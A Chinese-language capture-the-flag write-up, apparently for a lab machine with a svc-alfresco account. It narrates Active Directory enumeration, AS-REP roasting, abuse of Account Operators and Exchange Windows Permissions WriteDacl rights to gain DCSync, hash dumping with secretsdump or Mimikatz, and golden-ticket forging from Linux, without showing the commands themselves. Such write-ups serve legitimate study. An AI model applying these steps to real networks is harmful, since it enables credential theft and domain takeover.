信息收集

据说这台机器很难，所以我决定逐个端口枚举，正好它也没有HTTP服务

尝试DNS区域传输，没有收获

SMB枚举，没有权限

LDAP枚举和以前没什么区别，这里允许匿名枚举

这里我们可以通过userPrincipalName或sAMAccountName枚举用户名

这里可以使用windapsearch，它的原理相同，输出更美观一些，功能也多一些

枚举用户其实使用的是objectCategory=user这个过滤器，我们可以手动选择过滤器，来枚举其他对象

发现了服务账号svc-alfresco，

这是一个很重要的提醒，通过文章可以发现，该服务账户的使用需要打开DONT_REQ_PREAUTH，这表示我们可以尝试AS-REP roasting

再更进一步之前，我决定继续完成枚举工作

使用CME在空会话下，这里成功枚举出密码策略

比如Account Lockout Threshold: None就告诉我们，如果想，可以放心的进行多线程暴力破解

进行RCP枚举(445)

这里无法枚举SID

但这里可以使用一个Trick来直接枚举组的名称，组内的成员数量，和具体的组内成员是谁，以Domain Admins组为例

通过组织id号0x200

得到rid值0x1f4，我们可以直接查询它，得到用户Administrator

后面的套路类似，顺着枚举组就行了，类似

之后有了rid，就可以直接查询用户名了

最后88端口kerberos就不暴力枚举用户名了，有了之前的技巧我觉得这个操作显得很多余

提权

首先我是用PowerView解决当前用户的嵌套组

或者直接枚举用户组

输出很有意思，说明当前用户关系

在BloodHound中，我们可以Unrolled Group Membership更清晰的展示

知道组织关系是之后提权的关键，继续查看Find Shortest Paths to Domain Admins

滥用Account Operators组GenericAll权限

Account Operators组内的成员拥有创建/添加账户到不受保护组的权限(受保护的比如Domain Admins组、Account Operators组本身等)和本地登陆域控的权限，参考链接

这里我们将创建一个账户，并添加到Exchange Windows permissions组

习惯性将用户添加到本地Remote Management Users组，这样就拥有了WinRM连接的权限(虽然这里不需要用到该用户的shell)

为了利用，将用户添加到Exchange Windows permissions组

滥用Exchange Windows permissions组WriteDacl权限

在Exchange Windows permissions组，我们拥有WriteDacl权限，这表示我们可以DCSync参考:链接

首先添加权限(别忘了域账号前缀)

这样我就可以进行DCSync了。通过Mimikatz或Secretsdump.py

secretsdump需要TCP135，445和一个随机的高RPC端口

方法2 Goldenticket for Linux

平常GoldenTicket的利用都在目标机器上使用Mimikatz，这次我会在linux利用GoldenTicket

首先在机器上没枚举SID

得到`S-1-5-21-3072663084-364016917-1341370565

不知道为啥，时间设置后在使用psexec时，还会出现时间戳的错误Clock skew too great

先不管继续后面的操作

之后生成黄金票据，通过设置环境变量导入

添加hosts，进行域名解析

之后-k参数使用黄金票据进行验证

为了上述解决时间问题，决定暴力枚举。首先我们需要在目标机器上获取除了小时后面的时间

在本机上通过date -s暴力枚举，时间正常就可以使用黄金票据了(Kerberos允许5分钟内的误差，也就是+/- 300秒)

其实这里最正确的方法是使用NTP协议(UDP端口123)和域控同步时间
